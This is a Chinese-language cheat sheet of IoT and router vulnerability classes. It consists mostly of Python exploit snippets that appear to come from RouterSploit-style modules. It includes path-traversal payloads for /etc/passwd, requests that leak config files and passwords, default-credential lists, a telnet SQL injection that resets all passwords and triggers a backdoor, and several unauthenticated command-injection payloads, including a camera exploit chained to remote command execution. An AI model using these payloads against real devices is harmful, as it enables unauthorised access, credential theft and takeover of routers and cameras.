# 漏洞分类

未授权漏洞：
ftp、http、snmp、ssh、telnet 默认账户
登录凭证泄露： 

读取/etc/passwd 

```python
path = "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C..{}".format(self.filename)
```
```python
path = "/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../..{}".format(self.filename)
```
```python
path = "/../../../../../../../../../../../..{}".format(self.filename)
```
```python
path = "/cgi-bin/webproc?getpage={}&var:page=deviceinfo".format(self.filename)
```
```python
data = {
        "__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../..{}".format(self.filename),
        "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
        "__ENH_ERROR_REDIRECT_PATH__": "",
        "username": "tech"
        }

response = self.http_request(
    method="POST",
    path="/goform/enhAuthHandler",
    headers=headers,
    data=data,
)
```

```python
self.resources = (
            "/cgi-bin/check.cgi?file=../../..{}",
            "/cgi-bin/chklogin.cgi?file=../../..{}"
        )
```
```python
path = "/../../../../..{}".format(self.filename)
    response = self.http_request(
        method="GET",
        path=path
    )
```
```python
response = self.http_request(
            method="GET",
            path="/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        )
```
泄露配置文件：
```python
"/configfile.dump?action=get"
"/configfile.dump.backup"
"/configfile.dump.gz"
"/configfile.dump"
```

```python
response = self.http_request(
            method="GET",
            path="/frame/GetConfig"
        )
```
利用低权限用户获取账号密码：
```python
self.credentials = (
            ("admin", "admin"),
            ("viewer", "viewer"),
            ("rviewer", "rviewer"),
        )
self.http_request(
                method="GET",
                path="/cgi-bin/users.cgi?action=getUsers",
                auth=(username, password)
            )
```

SQL注入

```python
telnet_client = self.telnet_create()
telnet_client.connect()
telnet_client.read_until(tn, "Username: ")
telnet_client.write("';update user set password='a';--\r\n")  # This changes all the passwords to 'a'
telnet_client.read_until("Password: ")
telnet_client.write("nothing\r\n")
telnet_client.read_until("Username: ")
telnet_client.write("admin\r\n")
telnet_client.read_until("Password: ")
telnet_client.write("a\r\n")  # Login with the new password
telnet_client.read_until("> ")
telnet_client.write("!#/ port lol\r\n")  # Backdoor command triggers telnet server to startup.
telnet_client.read_until("> ")
telnet_client.write("quit\r\n")
telnet_client.close()
```

泄漏账户密码
```python
response = self.http_request(
            method="GET",
            path="/login.stm",
        )
```
```python
response = self.http_request(
            method="GET",
            path="/SaveCfgFile.cgi",
        )
if response is None:
    return False  # target is not vulnerable

var = [
    'pppoe_username',
    'pppoe_password',
    'wl0_pskkey',
    'wl0_key1',
    'mradius_password',
    'mradius_secret',
    'httpd_password',
    'http_passwd',
    'pppoe_passwd'
]
```
```python
response = self.http_request(
            method="GET",
            path="/password.cgi"
        )

```
```python
response = self.http_request(
    method="GET",
    path="/cgi-bin/readfile.cgi?query=ADMINID",
)
```

```python

response = self.http_request(
        method="GET",
        path="/cgi-bin/jvsweb.cgi?cmd=account&action=list"
        )
```

```python
cookies = {
            "uid": "admin",
        }
response = self.http_request(
    method="GET",
    path="/device.rsp?opt=user&cmd=list",
    cookies=cookies,
)
```
```python
response = self.http_request(
    method="GET",
    path="/s_brief.htm",
)
if response is None:
    return False  # target is not vulnerable

if "szUsername" in response.text and "szPassword" in response.text:
    return True  # target is vulnerable
```

WPA passwd
```python
check1 = self.http_request(
            method="GET",
            path="//etc/RT2870STA.dat",
        )
response = self.http_request(
                method="GET",
                path="//proc/kcore",
                stream=True
            )
```


泄漏内存 内存中有账户密码
```python
response = self.http_request(
            method="GET",
            path="/system.ini?loginuse&loginpas"
        )
```
> 结合上个漏洞 实现rce
[https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html][]
```python
# Send command
command_url = "{}:{}/set_ftp.cgi?next_url=ftp.htm&loginuse={}&loginpas={}&svr=192.168.1.1&port=21&user=ftp&pwd=$({})&dir=/&mode=PORT&upload_interval=0".format(self.target, self.port, username, password, cmd)
http_request(method="GET", url=command_url)

# Run command
run_url = "{}:{}/ftptest.cgi?next_url=test_ftp.htm&loginuse={}&loginpas={}".format(self.target, self.port, username, password)
http_request(method="GET", url=run_url)
```

未授权命令执行
```python
path = "/shell?{}".format(cmd)
        response = self.http_request(
            method="GET",
            path=path,
        )
```
```python
path = "/cgi-bin/apply.cgi?ssid=\"%20\"`{}`".format(cmd)

response = self.http_request(
    method="GET",
    path=path
)
```

```python
path = "/utility.cgi?testType=1&IP=aaa || {}".format(cmd)
self.http_request(
    method="GET",
    path=path,
)
return ""
```
```python
path = "/cgi-bin/script?system%20{}".format(cmd)
```

```python
payload = ";{};".format(cmd)
data = {
    "Client": payload,
    "Download": "Download"
}

self.http_request(
    method="POST",
    path="/cgi-bin/rdfs.cgi",
    data=data
)
```
```python
data = "GO=&jump=" + "A" * 1379 + ";{};&ps=\n\n".format(cmd)
```
```python
data = '<cmd><ITEM cmd="traceroute" addr="$({})" /></cmd>'
        # Blind unauth RCE so we first create a file in the www-root directory
cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')
response = self.http_request(
    method="POST",
    path="/cgi-bin/cgiSrv.cgi",
    headers=headers,
    data=cmd_echo
)
```

泄漏SQL凭证
```python
self.paths = [
            "/imc/reportscript/sqlserver/deploypara.properties",
            "/rpt/reportscript/sqlserver/deploypara.properties",
            "/imc/reportscript/oracle/deploypara.properties"
        ]
for path in self.paths:
    response = self.http_request(
        method="GET",
        path=path,
    )
```


通用漏洞 
- 心脏滴血
- 破壳
- 公开的ssh key



其他
asus 需要注意一下 udp
cookie 生成算法 